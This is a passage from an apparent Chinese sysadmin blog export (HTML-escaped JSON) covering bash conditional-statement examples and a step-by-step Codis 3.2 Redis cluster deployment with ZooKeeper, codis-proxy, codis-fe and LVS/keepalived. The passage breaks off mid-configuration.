&quot;$num1&quot; ] &amp;&amp; echo &quot;第一个变量未赋值&quot; &amp;&amp; exit 1[ -z &quot;$num2&quot; ] &amp;&amp; echo &quot;第二个变量未赋值&quot; &amp;&amp; exit 1#判断是不是整数expr 2 + &quot;$num1&quot; &amp;&gt;&#x2F;dev&#x2F;null[ $? -eq 2 ] &amp;&amp; echo “第一个不是数字” &amp;&amp; exit 1expr 2 + &quot;$num2&quot; &amp;&gt;&#x2F;dev&#x2F;null[ $? -eq 2 ] &amp;&amp; echo “第二个不是数字” &amp;&amp; exit 1#正式判断[ $num1 -gt $num2 ] &amp;&amp; echo &quot;$num1 &gt; $num2&quot; &amp;&amp; exit[ $num1 -eq $num2 ] &amp;&amp; echo &quot;$num1 &#x3D; $num2&quot; &amp;&amp; exit[ $num1 -lt $num2 ] &amp;&amp; echo &quot;$num1 &lt; $num2&quot; 测试结果：[root@jkbackup shell]# sh read.sh USAGE：sh read.sh num1 num2[root@jkbackup shell]# sh read.sh 1.5 2“第一个不是数字”[root@jkbackup shell]# [root@jkbackup shell]# sh read.sh 5 105 &lt; 10 1234567891011121314151617181920212223read读入方式[root@jkbackup shell]# cat read.sh #!&#x2F;bin&#x2F;bashread -p &quot;请输入第一个数字: &quot; num1read -p &quot;请输入第二个数字: &quot; num2#判断变量不为空[ -z &quot;$num1&quot; ] &amp;&amp; echo &quot;第一个变量未赋值&quot; &amp;&amp; exit 1[ -z &quot;$num2&quot; ] &amp;&amp; echo &quot;第二个变量未赋值&quot; &amp;&amp; exit 1#判断是不是整数expr 2+&quot;$num1&quot; &amp;&gt;&#x2F;dev&#x2F;null[ $? -eq 2 ] &amp;&amp; echo “第一个不是数字” &amp;&amp; exit 1expr 2+&quot;$num2&quot; &amp;&gt;&#x2F;dev&#x2F;null[ $? -eq 2 ] &amp;&amp; echo “第二个不是数字” &amp;&amp; exit 1#正式判断[ $num1 -gt $num2 ] &amp;&amp; echo &quot;$num1 &gt; $num2&quot; &amp;&amp; exit[ $num1 -eq $num2 ] &amp;&amp; echo &quot;$num1 &#x3D; $num2&quot; &amp;&amp; exit[ $num1 -lt $num2 ] &amp;&amp; echo &quot;$num1 &lt; $num2&quot; 条件语句 if条件语句 单分支语句 12如果 条件成立；则 执行命令 12345678910111213if [ $num1 -gt $num2 ];then echo &quot;$num1&quot; &gt; &quot;$num2&quot; exitfi if [ $num1 -lt $num2 ];then echo &quot;$num1&quot; &lt; &quot;$num2&quot; exitfi if [ $num1 -eq $num2 ];then echo &quot;$num1&quot; &#x3D; &quot;$num2&quot;fi 双分支语句 1234567if [ $num1 -gt $num2 ];then echo &quot;$num1&quot; &gt; &quot;$num2&quot; exitelse echo &quot;$num1&quot; 不大于 &quot;$num2&quot;fi 多分支语句 12345678910if [ $num1 -gt $num2 ];then echo &quot;$num1 &gt; $num2&quot;elif [ $num1 -eq $num2 ];then echo &quot;$num1 &#x3D; $num2&quot;else echo &quot;$num1 &lt; $num2&quot; fi 小结 123单分支：一个条件一个结果双分支：一个条件多个结果多分支语句: 多个条件多个结果 练习 1要求：使用脚本监测系统内存，低于100M发邮件报警, 3分钟检查一次 1234567891011#!&#x2F;bin&#x2F;bashmem&#x3D;&#96;free -m | awk &#39;NR&#x3D;&#x3D;2&#123;print $NF&#125;&#39;&#96;if [ $mem -lt 1600 ];then echo “警告:系统可用内存低于100M” &amp;&amp; echo &quot;当前值:$mem&quot;|mail -s WARNING 110@110.cnelse exit 0fi 写一个nginx启动脚本 1234567[root@jenkins scripts]# . &#x2F;etc&#x2F;init.d&#x2F;functions [root@jenkins scripts]# action &quot;start nginx&quot; &#x2F;bin&#x2F;truestart nginx [ 确定 ][root@jenkins scripts]# action &quot;start nginx&quot; &#x2F;bin&#x2F;falsestart nginx [失败]调用上述的functions就可以返回“确定”或“失败”","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"}]},{"title":"Codis3.2.0集群部署","slug":"Codis3.2集群部署","date":"2017-11-28T07:35:54.000Z","updated":"2017-11-30T10:25:35.670Z","comments":true,"path":"2017/11/28/Codis3.2集群部署/","link":"","permalink":"https://garywu520.github.io/2017/11/28/Codis3.2%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/","excerpt":"codis介绍 123codis是一个分布式redis集群解决方案，对于上层的应用来说, 连接到codis-proxy和连接原生的redis-server没有明显的区别。上层应用可以像使用单机的redis一样使用，codis底层会处理请求的转发，不停机的数据迁移等工作。所有后边的一切事情，对于前面的客户端来说是透明的，可以简单的认为后边连接的是一个内存无限大的redis服务。","text":"codis介绍 123codis是一个分布式redis集群解决方案，对于上层的应用来说, 连接到codis-proxy和连接原生的redis-server没有明显的区别。上层应用可以像使用单机的redis一样使用，codis底层会处理请求的转发，不停机的数据迁移等工作。所有后边的一切事情，对于前面的客户端来说是透明的，可以简单的认为后边连接的是一个内存无限大的redis服务。 codis体系结构 1234567Codis引入了Group的概念，每个Group包括1个Redis Master及至少1个Redis Slave，这是和Twemproxy的区别之一。这样做的好处是，如果当前Master有问题，则运维人员可通过Dashboard“自助式”切换到Slave，而不需要小心翼翼地修改程序配置文件。为支持数据热迁移（Auto Rebalance），出品方修改了Redis Server源码，并称之为Codis Server。Codis采用预先分片（Pre-Sharding）机制，事先规定好了，分成1024个slots（也就是说，最多能支持后端1024个Codis Server），这些路由信息保存在ZooKeeper中。ZooKeeper还维护Codis Server Group信息，并提供分布式锁等服务。 Codis 3.x 由以下组件组成： Codis Server：基于 redis-3.2.8 分支开发。增加了额外的数据结构，以支持 slot 有关的操作以及数据迁移指令。具体的修改可以参考文档 redis 的修改。 Codis Proxy：客户端连接的 Redis 代理服务, 实现了 Redis 协议。 除部分命令不支持以外(不支持的命令列表)，表现的和原生的 Redis 没有区别（就像 Twemproxy）。 对于同一个业务集群而言，可以同时部署多个 codis-proxy 实例； 不同 codis-proxy 之间由 codis-dashboard 保证状态同步。 Codis Dashboard：集群管理工具，支持 codis-proxy、codis-server 的添加、删除，以及据迁移等操作。在集群状态发生改变时，codis-dashboard 维护集群下所有 codis-proxy 的状态的一致性。 对于同一个业务集群而言，同一个时刻 codis-dashboard 只能有 0个或者1个； 所有对集群的修改都必须通过 codis-dashboard 完成。 Codis Admin：集群管理的命令行工具。 可用于控制 codis-proxy、codis-dashboard 状态以及访问外部存储。 Codis FE：集群管理界面。 多个集群实例共享可以共享同一个前端展示页面； 通过配置文件管理后端 codis-dashboard 列表，配置文件可自动更新。 Storage：为集群状态提供外部存储。 提供 Namespace 概念，不同集群的会按照不同 product name 进行组织； 目前仅提供了 Zookeeper、Etcd、Fs 三种实现，但是提供了抽象的 interface 可自行扩展。 重要概念 关于多产品线部署 1234很多朋友问我们如果有多个项目时，codis 如何部署比较好，我们当时在豌豆荚的时候，一个产品线会部署一整套codis，但是zk 共用一个，不同的codis 集群拥有不同的product name 来区分，codis 本身的设计没有命名空间那么一说，一个codis 只能对应一个product name。不同product name 的codis 集群在同一个zk 上不会相互干扰。 关于zookeeper 123由于Codis 是一个强依赖的zk 的项目，而且在proxy 和zk 的连接发生抖动造成sessionexpired 的时候，proxy 是不能对外提供服务的，所以尽量保证proxy 和zk 部署在同一个机房。生产环境中zk 一定要是&gt;&#x3D;3 台的奇数台机器，建议5 台物理机。 关于HA高可用 123456这里的HA 分成两部分:一个是proxy 层的HA，还有底层Redis 的HA。先说proxy 层的HA。之前提到过proxy 本身是无状态的，所以proxy 本身的HA 是比较好做的，因为连接到任何一个活着的proxy 上都是一样的，在生产环境中，我们使用的是jedis，这个是我们开发的一个jedis 连接池，很简单，就是监听zk 上面的存活proxy 列表，挨个返回jedis 对象，达到负载均衡和HA 的效果。也有朋友在生产环境中使用LVS 和HA Proxy来做负载均衡，这也是可以的。 Redis 本身的HA，这里的Redis 指的是codis 底层的各个server group 的master，在一开始的时候codis 本来就没有将这部分的HA 设计进去，因为Redis 在挂掉后，如果直接将slave 提升上来的话，可能会造成数据不一致的情况，因为有新的修改可能在master 中还没有同步到slave 上，这种情况下需要管理员手动的操作修复数据。后来我们发现这个需求确实比较多的朋友反映，于是我们开发了一个简单的ha 工具：codis-ha，用于监控各个server group 的master 的存活情况，如果某个master 挂掉了，会直接提升该group 的一个slave 成为新的master。 项目的地址是：https:&#x2F;&#x2F;github.com&#x2F;ngaut&#x2F;codisha 关于dashboard 12dashboard 在codis 中是一个很重要的角色，所有的集群信息变更操作都是通过dashboard 发起的（这个设计有点像docker），dashboard 对外暴露了一系列RESTfulAPI 接口，不管是web 管理工具，还是命令行工具都是通过访问这些httpapi 来进行操作的，所以请保证dashboard 和其他各个组件的网络连通性。比如，经常发现有用户的dashboard 中集群的ops 为0，就是因为dashboard 无法连接到proxy 的机器的缘故。 关于主从和bgsave 1bgsave：codis 本身并不负责维护Redis 的主从关系，在codis 里面的master和slave 只是概念上的：proxy 会将请求打到「master」上，master 挂了codis-ha 会将某一个「slave」提升成master。而真正的主从复制，需要在启动底层的Redis 时手动的配置。在生产环境中，我建议master 的机器不要开bgsave，也不要轻易的执行save 命令，数据的备份尽量放在slave 上操作。 关于跨机房/多活 1想都别想codis 没有多副本的概念，而且codis 多用于缓存的业务场景，业务的压力是直接打到缓存上的，在这层做跨机房架构的话，性能和一致性是很难得到保证的 重要Q&amp;A Q1: codis没有多副本概念？ 1Codis 是一个分布式Redis 解决方案，是通过presharding 把数据在概念上分成1024 个slot，然后通过proxy 将不同的key的请求转发到不同的机器上，数据的副本还是通过Redis本身保证。 Q2：Codis 的信息在一个zk 里面存储着，zk 在Codis 中还有别的作用吗？主从切换为何不用sentinel？ 1Codis 的特点是动态的扩容缩容，对业务透明；zk 除了存储路由信息，同时还作为一个事件同步的媒介服务，比如变更master 或者数据迁移这样的事情，需要所有的proxy 通过监听特定zk 事件来实现。可以说zk 被我们当做了一个可靠的rpc 的信道来使用。因为只有集群变更的admin 时候会往zk 上发事件，proxy 监听到以后，回复在zk 上，admin 收到各个proxy 的回复后才继续。本身集群变更的事情不会经常发生，所以数据量不大。Redis 的主从切换是通过codis-ha 在zk 上遍历各个server group 的master 判断存活情况，来决定是否发起提升新master 的命令。 Q3: 数据分片，是用的一致性hash 吗 1不是，是通过presharding，hash 算法是crc32(key)%1024 Q4：Redis 跨机房有什么方案？ 123目前没有好的办法，我们的Codis 定位是同一个机房内部的缓存服务，跨机房复制对于Redis 这样的服务来说，一是延迟较大，二是一致性难以保证，对于性能要求比较高的缓存服务，我觉得跨机房不是好的选择。 Q5：集群的主从怎么做（比如集群S 是集群M 的从）？ 12Codis 只是一个proxy-based 的中间件，并不负责数据副本相关的工作。也就是数据只有一份，在Redis 内部。 Q6: codis的设计初衷与特点在何处？ 1Codis更多的是为了替换twemproxy的一个项目。Redis 是cache，Codis 主要解决的是Redis单点和水平扩展的问题 Q7：可否介绍下codis 的autorebalance(自动再平衡) 实现？ 123456789101112算法比较简单。其实就是根据各个实例的内存比例，分配slot.实现：自动再平衡（auto rebalance）Codis 支持动态的根据实例内存，自动对slot进行迁移，以均衡数据分布命令：bin&#x2F;codis-config slot rebalance要求:所有的codis-server都必须设置了maxmemory参数；所有的 slots 都应该处于 online 状态, 即没有迁移任务正在执行；所有 server group 都必须有 Master； Q8: 主要想了解对降低数据迁移对线上服务的影响? 1其实现在codis 数据迁移的方式已经很温和了，是一个个key 的原子迁移，如果怕抖动甚至可以加上每个key 的延迟时间。这个好处就是对业务基本没感知，但是缺点就是慢。 codis集群部署实战 角色说明 12345678910111213141516zookeeper集群：10.0.10.4110.0.10.4210.0.10.43condis-server(非原生redis,每台机器俩进程,如下):10.0.10.47:6379(主) 10.0.10.48:6380(从) 10.0.10.48:6379(主) 10.0.10.49:6380(从) 10.0.10.49:6379(主) 10.0.10.47:6380(从) codis-dashboard + codis-fe10.0.10.40codis-proxy + nginx-tcp lvs:10.0.10.44 10.0.10.45 安装zookeeper-[41/42/43服务器配置]快速移步查看：zookeeper集群部署 12作用：用于存放数据路由表。 zookeeper简称zk。在生产环境中，zk部署越多，其可靠性越高。由于zk集群是以宕机个数过半才会让整个集群宕机，因此，奇数个zk更佳。 安装go环境-[除了zk服务器之外都安装] 安装依赖 1yum install -y git gcc make g++ gcc-c++ automake openssl-devel zlib-* 安装go 123456789101112131415161718下载地址：wget https:&#x2F;&#x2F;mirrors.nju.edu.cn&#x2F;golang&#x2F;go1.7.6.linux-amd64.tar.gz解压到&#x2F;usr&#x2F;localtar -xf go1.7.6.linux-amd64.tar.gz -C &#x2F;usr&#x2F;local 把go加入到系统的环境变量cat &gt;&gt;&#x2F;etc&#x2F;profile &lt;&lt; EOFexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;go&#x2F;binexport GOPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;EOFsource &#x2F;etc&#x2F;profile[root@localhost local]# env |grep goPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;root&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin[root@localhost local]# go versiongo version go1.7.6 linux&#x2F;amd64 安装codis-[除了zk服务器之外都安装]123456789101112https:&#x2F;&#x2F;codeload.github.com&#x2F;CodisLabs&#x2F;codis&#x2F;tar.gz&#x2F;3.2.0mkdir -p &#x2F;usr&#x2F;local&#x2F;src&#x2F;github.com&#x2F;CodisLabs&#x2F;tar -zxvf &#x2F;root&#x2F;codis-3.2.0.tar.gz -C &#x2F;usr&#x2F;local&#x2F;src&#x2F;github.com&#x2F;CodisLabs&#x2F;cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;github.com&#x2F;CodisLabs&#x2F;mv codis-3.2.0 codiscd codis &amp;&amp; make.&#x2F;bin&#x2F;redis-cli -vln -s &#x2F;usr&#x2F;local&#x2F;src&#x2F;github.com&#x2F;CodisLabs&#x2F; &#x2F;usr&#x2F;local&#x2F;[root@localhost codis]# cat bin&#x2F;versionversion &#x3D; unknown versioncompile &#x3D; 2017-11-29 04:56:00 -0500 by go version go1.7.6 linux&#x2F;amd64 集群配置前需要了解的问题集群分片主要分三种： 123客户端分片：这个需要自己开发，对客户端要求严格，集群很难扩容代理端分片：如codis，对客户端几乎无要求，集群容易扩容服务端分片：如redis集群，需要智能客户端支持集群协议的，集群容易扩容 codis3.2集群架构 1234567891011codis3.2集群架构服务端：codis-fe------codis-dashboard------codis-proxy------codis-group------codis-server客户端：client------nginx-tcp------codis-proxycdis-fe可以管理多个codis-dashboard每个codis-dashboard代表一个产品线，每个codis-dashboard可以管理多个codis-proxy每个codis-proxy可以管理多个codis-server group每个codis-server group至少由两个codis-server组成，最少1主1备由上可知一个大的codis集群可以分多个产品线，客户端连接各个产品线的codis-proxy，业务线之间可以做到物理隔离，比如group1，group2，group3分给codis-product1业务线，group4，group5，group6分给codis-product2业务线，codis-dashboard配置保存在zookeeper里。 特别注意 123同一个codis-server可以加入多个codis-dashboard的codis-group里，但是在不同的codis-dashboard里面主备的角色要一致，这代表逻辑隔离。同一个codis-server只加入唯一的codis-dashboard的codis-group里，这代表物理隔离。 集群配置重申下基本操作目录 12Codis软链目录：&#x2F;usr&#x2F;local&#x2F;codisCodis实际安装目录：&#x2F;usr&#x2F;local&#x2F;src&#x2F;github.com&#x2F;CodisLabs&#x2F;codis 配置dashboard(在10.0.10.40上配置) 配置并启动codis-dashboard 修改dashboard配置文件 12cd &#x2F;usr&#x2F;local&#x2F;codiscat config&#x2F;dashboard.toml 结果如下： 123456[root@localhost codis]# egrep -v &quot;^#|^$&quot; config&#x2F;dashboard.toml #主要修改以下几项内容coordinator_name &#x3D; &quot;zookeeper&quot;coordinator_addr &#x3D; &quot;10.0.10.41:2181,10.0.10.42:2181,10.0.10.43:2181&quot;product_name &#x3D; &quot;codis-product1&quot;product_auth &#x3D; &quot;&quot;admin_addr &#x3D; &quot;0.0.0.0:18080&quot; 修改启动脚本并启动服务 1234修改zookeeper地址池与product名称egrep -v &quot;^#|^$&quot; admin&#x2F;codis-dashboard-admin.sh搜索并修改成如下配置：CODIS_ADMIN_TOOL_BIN -v --remove-lock --product&#x3D;codis-product1 --zookeeper&#x3D;10.0.10.41:2181,10.0.10.42:2181,10.0.10.43:2181 12345678910111213启动codis-dashboardcd &#x2F;usr&#x2F;local&#x2F;codis&#x2F;admin&#x2F; &amp;&amp; .&#x2F;codis-dashboard-admin.sh start#查看codis-dashboard端口netstat -tulpn |grep codis-dashboatcp LISTEN 0 128 :::18080 :::* users:((&quot;codis-dashboard&quot;,pid&#x3D;18245,fd&#x3D;5))#查看日志tailf &#x2F;usr&#x2F;local&#x2F;codis&#x2F;log&#x2F;codis-dashboard.log.2017-11-29出现“2017&#x2F;11&#x2F;29 05:32:30 main.go:140: [WARN] [0xc4202d78c0] dashboard is working ...”说明启动成功。#检查服务http:&#x2F;&#x2F;10.0.10.40:18080&#x2F;topom #可以正常访问到相关配置数据 配置codis-proxy(在10.0.10.44和45服务器配置) 修改codis-proxy启动脚本 12345cd &#x2F;usr&#x2F;local&#x2F;codis搜索并修改“CODIS_DASHBOARD_ADDR”值，如下：[root@localhost codis]# cat admin&#x2F;codis-proxy-admin.sh|grep DASHCODIS_DASHBOARD_ADDR&#x3D;&quot;10.0.10.40:18080&quot; 修改proxy.toml配置 1234567[root@localhost codis]# cat config&#x2F;proxy.toml|grep -Ev &quot;^#|^$&quot;product_name &#x3D; &quot;codis-product1&quot; #修改product_name名称为刚才定义的codis-product1product_auth &#x3D; &quot;&quot;session_auth &#x3D; &quot;&quot;admin_addr &#x3D; &quot;0.0.0.0:11080&quot;proto_type &#x3D; &quot;tcp4&quot;proxy_addr &#x3D; &quot;0.0.0.0:19000&quot; 启动codis-proxy 1234[root@localhost codis]# .&#x2F;admin&#x2F;codis-proxy-admin.sh start.&#x2F;admin&#x2F;codis-proxy-admin.sh: line 20: ODIS_DASHBOARD_ADDR: command not found&#x2F;usr&#x2F;local&#x2F;codis&#x2F;admin&#x2F;..&#x2F;config&#x2F;proxy.tomlstarting codis-proxy ... 检查日志和端口 1234[root@localhost codis]# cat log&#x2F;codis-proxy.log.2017-11-292017&#x2F;11&#x2F;29 06:39:14 main.go:323: [WARN] rpc online proxy seems OK2017&#x2F;11&#x2F;29 06:39:14 main.go:213: [WARN] [0xc4201584d0] proxy is working ... 123[root@localhost codis]# ss -tulpn|grep codis-proxytcp LISTEN 0 128 *:19000 *:* users:((&quot;codis-proxy&quot;,pid&#x3D;17985,fd&#x3D;5))tcp LISTEN 0 128 :::11080 :::* users:((&quot;codis-proxy&quot;,pid&#x3D;17985,fd&#x3D;6)) 配置codis-server-[需要在10.0.10.47/48/49上操作]1234codis-server规划：10.0.10.47:6379(主) 10.0.10.48:6380(从) 10.0.10.48:6379(主) 10.0.10.49:6380(从) 10.0.10.49:6379(主) 10.0.10.47:6380(从) 修改codis-server启动脚本 1234567cd &#x2F;usr&#x2F;local&#x2F;codis&#x2F;复制并修改脚本cp admin&#x2F;codis-server-admin.sh admin&#x2F;codis-server-admin-6379.sh cp admin&#x2F;codis-server-admin.sh admin&#x2F;codis-server-admin-6380.shvim admin&#x2F;codis-server-admin-6379.sh vim admin&#x2F;codis-server-admin-6380.sh 123456vim admin&#x2F;codis-server-admin-6379.sh主要修改如下几点：CODIS_SERVER_PID_FILE&#x3D;&#x2F;var&#x2F;run&#x2F;redis_6379.pidCODIS_SERVER_LOG_FILE&#x3D;&#x2F;var&#x2F;log&#x2F;redis_6379.logCODIS_SERVER_CONF_FILE&#x3D;&#x2F;etc&#x2F;redis&#x2F;6379&#x2F;redis-6379.conf 123456vim admin&#x2F;codis-server-admin-6380.sh主要修改如下几点：CODIS_SERVER_PID_FILE&#x3D;&#x2F;var&#x2F;run&#x2F;redis_6380.pidCODIS_SERVER_LOG_FILE&#x3D;&#x2F;var&#x2F;log&#x2F;redis_6380.logCODIS_SERVER_CONF_FILE&#x3D;&#x2F;etc&#x2F;redis&#x2F;6380&#x2F;redis-6380.conf 修改服务配置 1234567创建redis配置文件存放目录[root@localhost codis]# mkdir &#x2F;etc&#x2F;redis&#x2F;6379 -p[root@localhost codis]# mkdir &#x2F;etc&#x2F;redis&#x2F;6380 -p创建redis RDB缓存文件的存放目录[root@localhost codis]# mkdir &#x2F;data&#x2F;redis&#x2F;6379 -p[root@localhost codis]# mkdir &#x2F;data&#x2F;redis&#x2F;6380 -p 123拷贝默认redis配置文件[root@localhost codis]# cp config&#x2F;redis.conf &#x2F;etc&#x2F;redis&#x2F;6379&#x2F;redis-6379.conf[root@localhost codis]# cp config&#x2F;redis.conf &#x2F;etc&#x2F;redis&#x2F;6380&#x2F;redis-6380.conf 123编辑配置文件(注：每个配置文件独立配置，因为3个redis从节点的slaveof配置不同)下面的主从关系有点绕，理顺了其实很简单。 47服务器-redis配置文件 10.0.10.47（主）redis-6379.conf 123456789101112131415vim &#x2F;etc&#x2F;redis&#x2F;6379&#x2F;redis-6379.conf #配置主文件bind 10.0.10.47port 6379tcp-keepalive 300daemonize yespidfile &#x2F;var&#x2F;run&#x2F;redis_6379.pidloglevel noticelogfile &quot;&#x2F;var&#x2F;run&#x2F;redis_6379.log&quot;databases 16save 900 1save 300 10save 60 10000dbfilename dump.rdbdir &#x2F;data&#x2F;redis&#x2F;6379 10.0.10.48（从）redis-6380.conf 1234567891011121314151617vim &#x2F;etc&#x2F;redis&#x2F;6379&#x2F;redis-6380.conf #配置主文件bind 10.0.10.47port 6380tcp-keepalive 300daemonize yespidfile &#x2F;var&#x2F;run&#x2F;redis_6380.pidloglevel noticelogfile &quot;&#x2F;var&#x2F;run&#x2F;redis_6380.log&quot;databases 16save 900 1save 300 10save 60 10000dbfilename dump.rdbdir &#x2F;data&#x2F;redis&#x2F;6380slaveof 10.0.10.48 6379slave-serve-stale-data yes 48服务器-redis配置文件 10.0.10.48的(主)redis-6379.conf 123456789101112131415vim &#x2F;etc&#x2F;redis&#x2F;6379&#x2F;redis-6379.conf #配置主文件bind 10.0.10.48port 6379tcp-keepalive 300daemonize yespidfile &#x2F;var&#x2F;run&#x2F;redis_6379.pidloglevel noticelogfile &quot;&#x2F;var&#x2F;run&#x2F;redis_6379.log&quot;databases 16save 900 1save 300 10save 60 10000dbfilename dump.rdbdir &#x2F;data&#x2F;redis&#x2F;6379 10.0.10.49（从）redis-6380.conf 1234567891011121314151617vim &#x2F;etc&#x2F;redis&#x2F;6379&#x2F;redis-6380.conf #配置主文件bind 10.0.10.48port 6380tcp-keepalive 300daemonize yespidfile &#x2F;var&#x2F;run&#x2F;redis_6380.pidloglevel noticelogfile &quot;&#x2F;var&#x2F;log&#x2F;redis_6380.log&quot;databases 16save 900 1save 300 10save 60 10000dbfilename dump.rdbdir &#x2F;data&#x2F;redis&#x2F;6380slaveof 10.0.10.49 6379slave-serve-stale-data yes 49服务器-redis配置文件 10.0.10.49（主）redis-6379.conf 123456789101112131415vim &#x2F;etc&#x2F;redis&#x2F;6379&#x2F;redis-6379.conf #配置主文件bind 10.0.10.49port 6379tcp-keepalive 300daemonize yespidfile &#x2F;var&#x2F;run&#x2F;redis_6379.pidloglevel noticelogfile &quot;&#x2F;var&#x2F;log&#x2F;redis_6379.log&quot;databases 16save 900 1save 300 10save 60 10000dbfilename dump.rdbdir &#x2F;data&#x2F;redis&#x2F;6379 10.0.10.47（从）redis-6380.conf 1234567891011121314151617vim &#x2F;etc&#x2F;redis&#x2F;6379&#x2F;redis-6380.conf #配置主文件bind 10.0.10.49port 6380tcp-keepalive 300daemonize yespidfile &#x2F;var&#x2F;run&#x2F;redis_6380.pidloglevel noticelogfile &quot;&#x2F;var&#x2F;log&#x2F;redis_6380.log&quot;databases 16save 900 1save 300 10save 60 10000dbfilename dump.rdbdir &#x2F;data&#x2F;redis&#x2F;6380slaveof 10.0.10.47 6379slave-serve-stale-data yes 分别启动47/48/49服务器的主从 12345[root@localhost codis]# .&#x2F;admin&#x2F;codis-server-admin-6379.sh startstarting codis-server ... [root@localhost codis]# .&#x2F;admin&#x2F;codis-server-admin-6380.sh startstarting codis-server ... 分别检测47/48/49服务器的日志与端口 123[root@localhost codis]# ss -lntup |grep 63*tcp LISTEN 0 128 10.0.10.47:6379 *:* users:((&quot;codis-server&quot;,pid&#x3D;18153,fd&#x3D;4))tcp LISTEN 0 128 10.0.10.47:6380 *:* users:((&quot;codis-server&quot;,pid&#x3D;18166,fd&#x3D;4)) 在47服务器上连接redis 6379端口查看codis-server主从关系 123456789101112131415[root@localhost codis]# .&#x2F;bin&#x2F;redis-cli -h 10.0.10.47 -p 637910.0.10.47:6379&gt; info............# Replicationrole:masterconnected_slaves:1slave0:ip&#x3D;10.0.10.49,port&#x3D;6380,state&#x3D;online,offset&#x3D;1709,lag&#x3D;1master_repl_offset:1709repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:2repl_backlog_histlen:1708............ 启动codis-fe-[在10.0.10.40上操作]12cd &#x2F;usr&#x2F;local&#x2F;codis&#x2F;vim admin&#x2F;codis-fe-admin.sh #主要修改以下几行 12345#COORDINATOR_NAME&#x3D;&quot;filesystem&quot;#COORDINATOR_ADDR&#x3D;&quot;&#x2F;tmp&#x2F;codis&quot;CODIS_FE_ADDR&#x3D;&quot;0.0.0.0:9090&quot;COORDINATOR_NAME&#x3D;&quot;zookeeper&quot;COORDINATOR_ADDR&#x3D;&quot;10.0.10.41:2181,10.0.10.42:2181,10.0.10.43:2181&quot; 启动codis-fe脚本 1.&#x2F;admin&#x2F;codis-fe-admin.sh start 检查日志与端口 1234567[root@localhost codis]# ss -lntup |grep 9090tcp LISTEN 0 128 :::9090 :::* users:((&quot;codis-fe&quot;,pid&#x3D;18409,fd&#x3D;6))[root@localhost codis]# tailf log&#x2F;codis-fe.log.2017-11-292017&#x2F;11&#x2F;29 08:19:23 zkclient.go:23: [INFO] zookeeper - zkclient setup new connection to 10.0.10.41:2181,10.0.10.42:2181,10.0.10.43:21812017&#x2F;11&#x2F;29 08:19:23 main.go:209: [WARN] option --pidfile &#x3D; &#x2F;usr&#x2F;local&#x2F;codis&#x2F;bin&#x2F;codis-fe.pid2017&#x2F;11&#x2F;29 08:19:23 zkclient.go:23: [INFO] zookeeper - Re-submitting &#96;0&#96; credentials after reconnect 访问codis-fe Web面板 1http:&#x2F;&#x2F;10.0.10.40:9090&#x2F;#codis-product1 codis-fe面板操作 通过codis-fe添加group 1通过web浏览器访问集群管理页面(fe地址:http:&#x2F;&#x2F;192.168.188.125:9090&#x2F;#codis-product1) 选择我们刚搭建的集群 codis-product1，在 Proxy 栏可看到我们已经启动的 Proxy， 但是Group 栏为空，因为我们启动的 codis-server 并未加入到集群. 添加 NEW GROUP 1NEW GROUP 行输入 1，再点击 NEW GROUP 即可。如图： 1根据我们的拓扑规划，需要依次添加3个group , 6个codis-server 。默认每组里面第一个添加的为主，第二个添加的设置为从，同一个节点2个实例不能设置为同一group。 如图： 消除界面中的从condis-server的背景颜色,如图： 通过codis-fe初始化solt 123新增的集群 slot 状态是 offline，因此我们需要对它进行初始化（将 1024 个 slot 分配到各个 group），而初始化最快的方法可通过fe提供的 rebalance all slots 按钮来做。自动分配1024个solt到3个group，点击“reblance all solts”按钮会自动分配完所有solt到3个group。如下图： 用codis-proxy代理-压力测试12345上面我们已经配置好了2个codis-proxy，接下来使用它们其一对部署的集群进行压力测试在其中一台codis-server上使用redis-benchmark命令进行测试。命令如下：cd &#x2F;usr&#x2F;loca&#x2F;codis.&#x2F;bin&#x2F;redis-benchmark -h 10.0.10.44 -p 19000 -q -n 1000000 -c 20 -d 100k 123456789101112命令行执行结果：[root@localhost codis]# .&#x2F;bin&#x2F;redis-benchmark -h 10.0.10.44 -p 19000 -q -n 1000000 -c 20 -d 100kPING_INLINE: 21769.42 requests per secondPING_BULK: 18310.32 requests per secondSET: 17011.14 requests per secondGET: 18086.45 requests per secondINCR: 17886.21 requests per secondLPUSH: 17146.48 requests per secondRPUSH: 17003.91 requests per secondLPOP: 17160.31 requests per secondRPOP: 17233.65 requests per secondSADD: 19542.32 Dashboard测试效果如下： 代理HA上层代理HA使用LVS+keepalived来实现, 使用zk集群中的41和42服务器来测试 安装ipvsadm管理工具并激活LVS 1234567891011#查看lvs模块lsmod |grep ip_vs#默认没有加载模块，所以需要安装管理工具激活yum -y install ipvsadm#查看管理工具ipvsadm状态ipvsadm#再次查看lvs模块lsmod |grep ip_vs 安装keepalived 12#安装keepalivedyum install -y keepalived 12#配置keepalivedvim &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf 41服务器keepalived配置文件 12345678910111213141516171819202122232425262728293031323334353637383940414243global_defs &#123; router_id LVS_01&#125;vrrp_instance VI_1 &#123; state MASTER interface eth0 virtual_router_id 51 priority 150 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 10.0.10.50&#x2F;24 &#125;&#125;virtual_server 10.0.10.50 19000 &#123; delay_loop 6 lb_algo wrr lb_kind DR nat_mask 255.255.255.0 persistence_timeout 50 protocol TCP real_server 10.0.10.44 19000 &#123; weight 1 TCP_CHECK &#123; connect_timeout 8 nb_get_retry 3 delay_before_retry 3 connect_port 19000 &#125; &#125; real_server 10.0.10.45 19000 &#123; weight 1 TCP_CHECK &#123; connect_timeout 8 nb_get_retry 3 delay_before_retry 3 connect_port 19000 &#125; &#125;&#125; 42服务器keepalived配置文件 12345678910111213141516171819202122232425262728293031323334353637383940414243global_defs &#123; router_id LVS_02&#125;vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 51 